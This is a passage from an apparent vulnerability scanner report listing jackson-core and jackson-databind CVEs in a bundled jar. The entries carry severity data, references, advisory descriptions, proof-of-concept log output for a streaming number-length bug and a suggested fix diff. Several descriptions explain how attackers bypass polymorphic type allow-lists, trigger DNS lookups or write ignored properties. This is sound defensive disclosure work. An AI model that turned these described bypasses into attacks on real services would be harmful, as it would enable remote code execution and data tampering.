+│                        │      │                   [ctrl] DataBuffer arrived size=200 ms=146
+│                        │      │                   [ctrl] DataBuffer arrived size=200 ms=147
+│                        │      │                   [ctrl] ERR after 155ms ... Number value length (1001)
+│                        │      │                   exceeds the maximum allowed (1000, ...)
+│                        │      │                   Patched server raises `StreamConstraintsException` at 155ms
+│                        │      │                    after only 5
+│                        │      │                   DataBuffers, exactly when the accumulated digit count
+│                        │      │                   crosses
+│                        │      │                   `maxNumberLength=1000`. The connection is reset mid-stream
+│                        │      │                   rather than the
+│                        │      │                   parser silently consuming the rest of the attacker's
+│                        │      │                   payload.
+│                        │      │                   Side-by-side:
+│                        │      │                   | Build | Chunks accepted before exception | Digits
+│                        │      │                   buffered | Time to detection |
+│                        │      │                   |---|---|---|---|
+│                        │      │                   | jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x
+│                        │      │                   the configured limit) | 6,548ms — only at terminator |
+│                        │      │                   | 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment
+│                        │      │                    threshold crossed |
+│                        │      │                   Note on the default `@RequestBody Mono<JsonNode>` path:
+│                        │      │                   that path cannot
+│                        │      │                   distinguish the two builds because Spring's `decodeToMono`
+│                        │      │                   joins all
+│                        │      │                   DataBuffers into one before parsing. The exploitable shape
+│                        │      │                   is the
+│                        │      │                   streaming-decode path (`Flux<JsonNode>` / `@RequestBody
+│                        │      │                   Flux<...>` /
+│                        │      │                   WebSocket / SSE / any direct
+│                        │      │                   `decoder.decode(Flux<DataBuffer>, ...)` call),
+│                        │      │                   which is also what `Jackson2Tokenizer` uses for any
+│                        │      │                   streaming JSON
+│                        │      │                   deserialization in WebFlux and Quarkus reactive REST.
+│                        │      │                   ## Suggested fix
+│                        │      │                   Mirror the pattern already used in `_finishFloatFraction`.
+│                        │      │                   At every site that returns `_updateTokenToNA()` (or
+│                        │      │                   `JsonToken.NOT_AVAILABLE`) with `_minorState =
+│                        │      │                   MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr +
+│                        │      │                   negMod)` first. Concretely, the diff to
+│                        │      │                   `NonBlockingUtf8JsonParserBase.java` would be:
+│                        │      │                   ```diff
+│                        │      │                        protected JsonToken _finishNumberIntegralPart(char[]
+│                        │      │                            int negMod = _numberNegative ? -1 : 0;
+│                        │      │                            while (true) {
+│                        │      │                                if (_inputPtr >= _inputEnd) {
+│                        │      │                                    _minorState =
+│                        │      │                   MINOR_NUMBER_INTEGER_DIGITS;
+│                        │      │                                    _textBuffer.setCurrentLength(outPtr);
+│                        │      │                   +               
+│                        │      │                   _streamReadConstraints.validateIntegerLength(outPtr +
+│                        │      │                   negMod);
+│                        │      │                                    return _updateTokenToNA();
+│                        │      │                                }
+│                        │      │                   Note: `_setIntLength` itself can't be used as-is because it
+│                        │      │                    also assigns `_intLength`, and `_intLength` must not be
+│                        │      │                   set until the integer is truly complete (subsequent
+│                        │      │                   fraction handling reads `_intLength`). The minimal fix is
+│                        │      │                   to call only the validator, as shown.
+│                        │      │                   Apply the same one-line insertion before each `return
+│                        │      │                   _updateTokenToNA();` that exits with `_minorState =
+│                        │      │                   MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above
+│                        │      │                   (12 lines total).
+│                        │      │                   Alternatively, a heavier refactor: also gate
+│                        │      │                   `_textBuffer.expandCurrentSegment()` calls inside the
+│                        │      │                   digit-accumulation loops on `outPtr < maxNumberLength` so
+│                        │      │                   that the validator fires at the moment the buffer would be
+│                        │      │                   enlarged past the limit, rather than waiting for the next
+│                        │      │                   chunk boundary. Either approach is sufficient.
+│                        │      │                   ## Credit
+│                        │      │                   Reported by `tonghuaroot` (`tonghuaroot@gmail.com`).
+│                        │      │                   Variant hunt against the Feb 2026 fix for
+│                        │      │                   GHSA-72hv-8253-57qq. 
+│                        │      ├ Severity        : HIGH 
+│                        │      ├ VendorSeverity   ─ ghsa: 3 
+│                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/V
+│                        │      │                         │            I:N/VA:H/SC:N/SI:N/SA:N 
+│                        │      │                         ╰ V40Score : 8.7 
+│                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-core 
+│                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-core/commit/050b
+│                        │      │                  │      429804dce2a7e08f0be1b0b4c3d040fdb9cd 
+│                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-core/commit/4cdd
+│                        │      │                  │      529749da396cc7edf6d4a2aad41d47902641 
+│                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-core/commit/c594
+│                        │      │                  │      1e5aae7fd5aeac55d66933cfb82b9aabeef8 
+│                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-core/pull/1611 
+│                        │      │                  ╰ [5]: https://github.com/FasterXML/jackson-core/security/ad
+│                        │      │                         visories/GHSA-r7wm-3cxj-wff9 
+│                        │      ├ PublishedDate   : 2026-07-21T21:58:53Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T21:58:53Z 
+│                        ├ [1]  ╭ VulnerabilityID : CVE-2026-54512 
+│                        │      ├ VendorIDs        ─ [0]: GHSA-j3rv-43j4-c7qm 
+│                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+│                        │      ├ PkgPath         : opt/oaf/openaf.jar 
+│                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databin
+│                        │      │                  │       d@2.21.1 
+│                        │      │                  ╰ UID : 3293a4ace0bf5e 
+│                        │      ├ InstalledVersion: 2.21.1 
+│                        │      ├ FixedVersion    : 2.18.8, 3.1.4, 2.21.4 
+│                        │      ├ Status          : fixed 
+│                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                        │      │                  │         197d9e39c5494d4581e40 
+│                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                        │      │                            df117adb7086d939b6bf5 
+│                        │      ├ SeveritySource  : ghsa 
+│                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54512 
+│                        │      ├ DataSource       ╭ ID  : ghsa 
+│                        │      │                  ├ Name: GitHub Security Advisory Maven 
+│                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+
+│                        │      │                          ecosystem%3Amaven 
+│                        │      ├ Fingerprint     : sha256:786f35b1ad3c80021fdf174f0566a863d2679765e43ae581d426
+│                        │      │                   62686de4f61a 
+│                        │      ├ Title           : jackson-databind: jackson-databind: Arbitrary code
+│                        │      │                   execution via PolymorphicTypeValidator bypass 
+│                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+│                        │      │                   functionality and tree-model for Jackson Data Processor.
+│                        │      │                   From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4,
+│                        │      │                   jackson-databind's PolymorphicTypeValidator (PTV) is the
+│                        │      │                   primary safety mechanism guarding polymorphic
+│                        │      │                   deserialization. When polymorphic typing is enabled and a
+│                        │      │                   type identifier contains generic parameters (i.e. the type
+│                        │      │                   ID string contains <),
+│                        │      │                   DatabindContext._resolveAndValidateGeneric() validates only
+│                        │      │                    the raw container class name (the substring before <)
+│                        │      │                   against the configured PTV. If the container type is
+│                        │      │                   approved, the method parses the full canonical type string
+│                        │      │                   via TypeFactory.constructFromCanonical() and returns the
+│                        │      │                   fully parameterized type without ever validating the nested
+│                        │      │                    type arguments against the PTV. The nested type arguments
+│                        │      │                   are then resolved, instantiated, and populated as beans
+│                        │      │                   during deserialization. An attacker who controls the type
+│                        │      │                   ID can therefore place a denied class as a generic type
+│                        │      │                   parameter of an allowed container — for example
+│                        │      │                   java.util.ArrayList<com.evil.Gadget> when only
+│                        │      │                   java.util.ArrayList is allow-listed. The container passes
+│                        │      │                   the PTV check; com.evil.Gadget is loaded via
+│                        │      │                   Class.forName(name, true, loader), instantiated, and its
+│                        │      │                   properties are set from attacker-controlled JSON. This
+│                        │      │                   completely bypasses an explicitly configured PTV
+│                        │      │                   allow-list. This vulnerability is fixed in 2.18.8, 2.21.4,
+│                        │      │                   and 3.1.4. 
+│                        │      ├ Severity        : HIGH 
+│                        │      ├ CweIDs           ╭ [0]: CWE-184 
+│                        │      │                  ╰ [1]: CWE-502 
+│                        │      ├ VendorSeverity   ╭ alma  : 3 
+│                        │      │                  ├ amazon: 3 
+│                        │      │                  ├ ghsa  : 3 
+│                        │      │                  ╰ redhat: 3 
+│                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:
+│                        │      │                  │        │           H/A:H 
+│                        │      │                  │        ╰ V3Score : 8.1 
+│                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:
+│                        │      │                           │           H/A:H 
+│                        │      │                           ╰ V3Score : 8.1 
+│                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:40895 
+│                        │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-54512 
+│                        │      │                  ├ [2] : https://bugzilla.redhat.com/2492010 
+│                        │      │                  ├ [3] : https://bugzilla.redhat.com/2492015 
+│                        │      │                  ├ [4] : https://errata.almalinux.org/9/ALSA-2026-40895.html 
+│                        │      │                  ├ [5] : https://github.com/FasterXML/jackson-databind 
+│                        │      │                  ├ [6] : https://github.com/FasterXML/jackson-databind/commit
+│                        │      │                  │       /434d6c511de7fdd9872f29157aafb6162d12d8d5 
+│                        │      │                  ├ [7] : https://github.com/FasterXML/jackson-databind/issues
+│                        │      │                  │       /5988 
+│                        │      │                  ├ [8] : https://github.com/FasterXML/jackson-databind/securi
+│                        │      │                  │       ty/advisories/GHSA-j3rv-43j4-c7qm 
+│                        │      │                  ├ [9] : https://nvd.nist.gov/vuln/detail/CVE-2026-54512 
+│                        │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2026-54512 
+│                        │      ├ PublishedDate   : 2026-06-23T21:17:02.203Z 
+│                        │      ╰ LastModifiedDate: 2026-06-27T21:01:36.47Z 
+│                        ├ [2]  ╭ VulnerabilityID : CVE-2026-54513 
+│                        │      ├ VendorIDs        ─ [0]: GHSA-rmj7-2vxq-3g9f 
+│                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+│                        │      ├ PkgPath         : opt/oaf/openaf.jar 
+│                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databin
+│                        │      │                  │       d@2.21.1 
+│                        │      │                  ╰ UID : 3293a4ace0bf5e 
+│                        │      ├ InstalledVersion: 2.21.1 
+│                        │      ├ FixedVersion    : 2.18.8, 2.21.4, 3.1.4 
+│                        │      ├ Status          : fixed 
+│                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                        │      │                  │         197d9e39c5494d4581e40 
+│                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                        │      │                            df117adb7086d939b6bf5 
+│                        │      ├ SeveritySource  : ghsa 
+│                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54513 
+│                        │      ├ DataSource       ╭ ID  : ghsa 
+│                        │      │                  ├ Name: GitHub Security Advisory Maven 
+│                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+
+│                        │      │                          ecosystem%3Amaven 
+│                        │      ├ Fingerprint     : sha256:bbe59b608f43f9a43ff6e91bd3e53f3f9da77840ca65712bc373
+│                        │      │                   dcb013a0971a 
+│                        │      ├ Title           : jackson-databind: Jackson-databind: Security bypass allows
+│                        │      │                   arbitrary code execution 
+│                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+│                        │      │                   functionality and tree-model for Jackson Data Processor.
+│                        │      │                   From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4,
+│                        │      │                   BasicPolymorphicTypeValidator.Builder.allowIfSubTypeIsArray
+│                        │      │                   () allowlists any array type based only on clazz.isArray(),
+│                        │      │                    without validating the array's component (element) type
+│                        │      │                   against the configured allowlist. A PTV built with
+│                        │      │                   allowIfSubTypeIsArray() plus an explicit concrete-type
+│                        │      │                   allowlist therefore still permits EvilType[] even though
+│                        │      │                   EvilType is not allowlisted. When Jackson deserializes the
+│                        │      │                   elements and no per-element type IDs are present, it
+│                        │      │                   instantiates the component type directly with no further
+│                        │      │                   PTV check, bypassing the allowlist. This vulnerability is
+│                        │      │                   fixed in 2.18.8, 2.21.4, and 3.1.4. 
+│                        │      ├ Severity        : HIGH 
+│                        │      ├ CweIDs           ─ [0]: CWE-184 
+│                        │      ├ VendorSeverity   ╭ alma  : 3 
+│                        │      │                  ├ amazon: 3 
+│                        │      │                  ├ ghsa  : 3 
+│                        │      │                  ╰ redhat: 3 
+│                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:
+│                        │      │                  │        │           H/A:H 
+│                        │      │                  │        ╰ V3Score : 8.1 
+│                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:
+│                        │      │                           │           H/A:H 
+│                        │      │                           ╰ V3Score : 8.1 
+│                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:36839 
+│                        │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:40895 
+│                        │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:41951 
+│                        │      │                  ├ [3] : https://access.redhat.com/security/cve/CVE-2026-54513 
+│                        │      │                  ├ [4] : https://bugzilla.redhat.com/2492010 
+│                        │      │                  ├ [5] : https://bugzilla.redhat.com/2492015 
+│                        │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2492010 
+│                        │      │                  ├ [7] : https://errata.almalinux.org/9/ALSA-2026-40895.html 
+│                        │      │                  ├ [8] : https://github.com/FasterXML/jackson-databind 
+│                        │      │                  ├ [9] : https://github.com/FasterXML/jackson-databind/commit
+│                        │      │                  │       /01d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5 
+│                        │      │                  ├ [10]: https://github.com/FasterXML/jackson-databind/commit
+│                        │      │                  │       /24529da29fdf46ff94ca38de9ebf31cd188f5e8e 
+│                        │      │                  ├ [11]: https://github.com/FasterXML/jackson-databind/issues
+│                        │      │                  │       /5981 
+│                        │      │                  ├ [12]: https://github.com/FasterXML/jackson-databind/issues
+│                        │      │                  │       /5983 
+│                        │      │                  ├ [13]: https://github.com/FasterXML/jackson-databind/pull/5
+│                        │      │                  │       984 
+│                        │      │                  ├ [14]: https://github.com/FasterXML/jackson-databind/securi
+│                        │      │                  │       ty/advisories/GHSA-rmj7-2vxq-3g9f 
+│                        │      │                  ├ [15]: https://nvd.nist.gov/vuln/detail/CVE-2026-54513 
+│                        │      │                  ├ [16]: https://security.access.redhat.com/data/csaf/v2/vex/
+│                        │      │                  │       2026/cve-2026-54513.json 
+│                        │      │                  ╰ [17]: https://www.cve.org/CVERecord?id=CVE-2026-54513 
+│                        │      ├ PublishedDate   : 2026-06-23T21:17:02.333Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T12:18:57.163Z 
+│                        ├ [3]  ╭ VulnerabilityID : CVE-2026-54514 
+│                        │      ├ VendorIDs        ─ [0]: GHSA-hgj6-7826-r7m5 
+│                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+│                        │      ├ PkgPath         : opt/oaf/openaf.jar 
+│                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databin
+│                        │      │                  │       d@2.21.1 
+│                        │      │                  ╰ UID : 3293a4ace0bf5e 
+│                        │      ├ InstalledVersion: 2.21.1 
+│                        │      ├ FixedVersion    : 2.18.8, 2.21.4, 3.1.4 
+│                        │      ├ Status          : fixed 
+│                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                        │      │                  │         197d9e39c5494d4581e40 
+│                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                        │      │                            df117adb7086d939b6bf5 
+│                        │      ├ SeveritySource  : ghsa 
+│                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54514 
+│                        │      ├ DataSource       ╭ ID  : ghsa 
+│                        │      │                  ├ Name: GitHub Security Advisory Maven 
+│                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+
+│                        │      │                          ecosystem%3Amaven 
+│                        │      ├ Fingerprint     : sha256:a3c870613184bd506dc63e25cb2dbde9142832e48cee8472a531
+│                        │      │                   e085622fdc98 
+│                        │      ├ Title           : jackson-databind: jackson-databind: Information Disclosure
+│                        │      │                   via Eager DNS Resolution 
+│                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+│                        │      │                   functionality and tree-model for Jackson Data Processor.
+│                        │      │                   From 2.0.0 until 2.18.8, 2.21.4, and 3.1.4,
+│                        │      │                   JDKFromStringDeserializer constructed InetSocketAddress
+│                        │      │                   with new InetSocketAddress(host, port), which performs
+│                        │      │                   eager DNS name resolution for hostname inputs at
+│                        │      │                   deserialization time. An application that binds untrusted
+│                        │      │                   JSON into a type containing an InetSocketAddress field
+│                        │      │                   issues an attacker-chosen DNS query during readValue,
+│                        │      │                   before any application-level validation or connect logic.
+│                        │      │                   The fix uses InetSocketAddress.createUnresolved(host,
+│                        │      │                   port), deferring DNS to an explicit connect. This
+│                        │      │                   vulnerability is fixed in 2.18.8, 2.21.4, and 3.1.4. 
+│                        │      ├ Severity        : MEDIUM 
+│                        │      ├ CweIDs           ─ [0]: CWE-918 
+│                        │      ├ VendorSeverity   ╭ amazon: 3 
+│                        │      │                  ├ ghsa  : 2 
+│                        │      │                  ╰ redhat: 2 
+│                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
+│                        │      │                  │        │           N/A:N 
+│                        │      │                  │        ╰ V3Score : 5.3 
+│                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
+│                        │      │                           │           N/A:N 
+│                        │      │                           ╰ V3Score : 5.3 
+│                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54514 
+│                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
+│                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/
+│                        │      │                  │      1f5a1037b1e9e05920e755cb35f198bcd46667e4 
+│                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/5951 
+│                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/securit
+│                        │      │                  │      y/advisories/GHSA-hgj6-7826-r7m5 
+│                        │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-54514 
+│                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-54514 
+│                        │      ├ PublishedDate   : 2026-06-23T21:17:02.467Z 
+│                        │      ╰ LastModifiedDate: 2026-06-27T20:55:09.61Z 
+│                        ├ [4]  ╭ VulnerabilityID : CVE-2026-54515 
+│                        │      ├ VendorIDs        ─ [0]: GHSA-5jmj-h7xm-6q6v 
+│                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+│                        │      ├ PkgPath         : opt/oaf/openaf.jar 
+│                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databin
+│                        │      │                  │       d@2.21.1 
+│                        │      │                  ╰ UID : 3293a4ace0bf5e 
+│                        │      ├ InstalledVersion: 2.21.1 
+│                        │      ├ FixedVersion    : 3.1.4, 2.18.9, 2.21.5, 2.22.1 
+│                        │      ├ Status          : fixed 
+│                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                        │      │                  │         197d9e39c5494d4581e40 
+│                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                        │      │                            df117adb7086d939b6bf5 
+│                        │      ├ SeveritySource  : ghsa 
+│                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54515 
+│                        │      ├ DataSource       ╭ ID  : ghsa 
+│                        │      │                  ├ Name: GitHub Security Advisory Maven 
+│                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+
+│                        │      │                          ecosystem%3Amaven 
+│                        │      ├ Fingerprint     : sha256:def36c8a6356da27a572e98b6c44a3834a905197354fd7d2cb99
+│                        │      │                   3afa5df77bf3 
+│                        │      ├ Title           : jackson-databind: jackson-databind: Ignored properties can
+│                        │      │                   be unexpectedly modified 
+│                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+│                        │      │                   functionality and tree-model for Jackson Data Processor.
+│                        │      │                   From 2.8.0 until 2.18.9, 2.21.5, and 3.1.4, in
+│                        │      │                   BeanDeserializerBase.createContextual(), per-property
+│                        │      │                   @JsonIgnoreProperties exclusions are applied by
+│                        │      │                   _handleByNameInclusion(), producing a contextual
+│                        │      │                   deserializer whose BeanPropertyMap has the ignored
+│                        │      │                   properties removed. The subsequent per-property
+│                        │      │                   case-insensitivity block (triggered by
+│                        │      │                   @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds
+│                        │      │                   from this._beanProperties (the original, unfiltered map)
+│                        │      │                   instead of contextual._beanProperties, then overwrites the
+│                        │      │                   filtered map — restoring every property
+│                        │      │                   _handleByNameInclusion had just removed. The ignored
+│                        │      │                   property becomes writable again. This vulnerability is
+│                        │      │                   fixed in 2.18.9, 2.21.5, and 3.1.4. 
+│                        │      ├ Severity        : MEDIUM 
+│                        │      ├ CweIDs           ─ [0]: CWE-915 
+│                        │      ├ VendorSeverity   ╭ amazon: 3 
+│                        │      │                  ├ ghsa  : 2 
+│                        │      │                  ╰ redhat: 2 
+│                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                        │      │                  │        │           L/A:N 
+│                        │      │                  │        ╰ V3Score : 5.3 
+│                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                        │      │                           │           L/A:N 
+│                        │      │                           ╰ V3Score : 5.3 
+│                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54515 
+│                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
+│                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/
+│                        │      │                  │      0e1b0b211f7a53baa62ba2f4c9bd006c7bf4d5fa 
+│                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/issues/
+│                        │      │                  │      5962 
+│                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/issues/
+│                        │      │                  │      5964 
+│                        │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/securit
+│                        │      │                  │      y/advisories/GHSA-5jmj-h7xm-6q6v 
+│                        │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-54515 
+│                        │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-54515 
+│                        │      ├ PublishedDate   : 2026-06-23T21:17:02.597Z 
+│                        │      ╰ LastModifiedDate: 2026-06-29T13:38:59.057Z 
+│                        ├ [5]  ╭ VulnerabilityID : CVE-2026-54516 
+│                        │      ├ VendorIDs        ─ [0]: GHSA-9fxm-vc8v-hj55 
+│                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+│                        │      ├ PkgPath         : opt/oaf/openaf.jar 
+│                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databin
+│                        │      │                  │       d@2.21.1 
+│                        │      │                  ╰ UID : 3293a4ace0bf5e 
+│                        │      ├ InstalledVersion: 2.21.1 
+│                        │      ├ FixedVersion    : 2.21.4, 3.1.4 
+│                        │      ├ Status          : fixed 
+│                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                        │      │                  │         197d9e39c5494d4581e40 
+│                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                        │      │                            df117adb7086d939b6bf5 
+│                        │      ├ SeveritySource  : ghsa 
+│                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54516 
+│                        │      ├ DataSource       ╭ ID  : ghsa 
+│                        │      │                  ├ Name: GitHub Security Advisory Maven 
+│                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+
+│                        │      │                          ecosystem%3Amaven 
+│                        │      ├ Fingerprint     : sha256:1b1efba5cba8249892e11b7c17172b2eaf34d179246285064d73
+│                        │      │                   bfeea16f2815 
+│                        │      ├ Title           : jackson-databind: jackson-databind: Security bypass due to
+│                        │      │                   improper handling of renamed properties 
+│                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+│                        │      │                   functionality and tree-model for Jackson Data Processor.
+│                        │      │                   From 2.21.0 until 2.21.4 and 3.1.4,
+│                        │      │                   POJOPropertiesCollector._renameProperties() allows a
+│                        │      │                   property with @JsonProperty("renamed") on the getter and
+│                        │      │                   @JsonIgnore on the setter to be renamed rather than
+│                        │      │                   dropped. With MapperFeature.INFER_PROPERTY_MUTATORS enabled
+│                        │      │                    (default), the private backing field is retained; during
+│                        │      │                   deserialization BeanDeserializerFactory.addBeanProps() sees
+│                        │      │                    hasField()==true, builds a FieldProperty, and makes the
+│                        │      │                   backing field writable. An attacker supplying the renamed
+│                        │      │                   JSON key writes the backing field directly, bypassing the
+│                        │      │                   @JsonIgnore on the setter. This vulnerability is fixed in
+│                        │      │                   3.1.4. 
+│                        │      ├ Severity        : MEDIUM 
+│                        │      ├ CweIDs           ─ [0]: CWE-915 
+│                        │      ├ VendorSeverity   ╭ ghsa  : 2 
+│                        │      │                  ╰ redhat: 2 
+│                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                        │      │                  │        │           L/A:N 
+│                        │      │                  │        ╰ V3Score : 5.3 
+│                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
+│                        │      │                           │           L/A:N 
+│                        │      │                           ╰ V3Score : 5.3 
+│                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54516 
+│                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
+│                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/
+│                        │      │                  │      c3d56dd25d52319828147c5b9aeabf2d485c250a 
+│                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/
+│                        │      │                  │      e88cb17006b6af4883b973058f0bb6486e5074af 
+│                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5967 
+│                        │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5968 
+│                        │      │                  ├ [6]: https://github.com/FasterXML/jackson-databind/securit
+│                        │      │                  │      y/advisories/GHSA-9fxm-vc8v-hj55 
+│                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54516 
+│                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54516 
+│                        │      ├ PublishedDate   : 2026-06-23T21:17:02.723Z 
+│                        │      ╰ LastModifiedDate: 2026-06-27T20:52:12.103Z 
+│                        ├ [6]  ╭ VulnerabilityID : CVE-2026-54517 
+│                        │      ├ VendorIDs        ─ [0]: GHSA-5hh8-q8hv-fr38 
+│                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+│                        │      ├ PkgPath         : opt/oaf/openaf.jar 
+│                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databin
+│                        │      │                  │       d@2.21.1 
+│                        │      │                  ╰ UID : 3293a4ace0bf5e 
+│                        │      ├ InstalledVersion: 2.21.1 
+│                        │      ├ FixedVersion    : 2.21.4, 3.1.4 
+│                        │      ├ Status          : fixed 
+│                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                        │      │                  │         197d9e39c5494d4581e40 
+│                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                        │      │                            df117adb7086d939b6bf5 
+│                        │      ├ SeveritySource  : ghsa 
+│                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54517 
+│                        │      ├ DataSource       ╭ ID  : ghsa 
+│                        │      │                  ├ Name: GitHub Security Advisory Maven 
+│                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+
+│                        │      │                          ecosystem%3Amaven 
+│                        │      ├ Fingerprint     : sha256:75e6b1ea0a23a3e53b6eb81591459d5242e4ec74e874ec8052ce
+│                        │      │                   a06a944d75ab 
+│                        │      ├ Title           : jackson-databind: jackson-databind: Information disclosure
+│                        │      │                   via improper JsonView filter application 
+│                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+│                        │      │                   functionality and tree-model for Jackson Data Processor.
+│                        │      │                   From 2.21.0 until 2.21.4 and 3.1.4, in
+│                        │      │                   BeanDeserializer._deserializeUsingPropertyBased, the
+│                        │      │                   active-view (@JsonView) filter was applied only to creator
+│                        │      │                   properties; the regular property-buffering branch performed
+│                        │      │                    no prop.visibleInView(activeView) check. A change making
